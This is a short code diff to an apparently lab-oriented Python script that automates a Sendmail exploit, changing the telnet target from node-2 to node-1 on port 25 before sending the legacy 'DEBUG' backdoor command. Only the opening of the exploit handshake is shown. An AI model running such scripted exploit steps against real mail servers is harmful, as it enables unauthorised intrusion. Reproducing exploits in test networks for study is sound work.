@@ -22,7 +22,7 @@ def run_sendmail():
 
     # 3. SMTP Exploit Handshake
     # Each command is followed by a 2s delay as requested
-    child.sendline('telnet node-2 25')
+    child.sendline('telnet node-1 25')
     time.sleep(2)
     
     child.sendline('DEBUG')
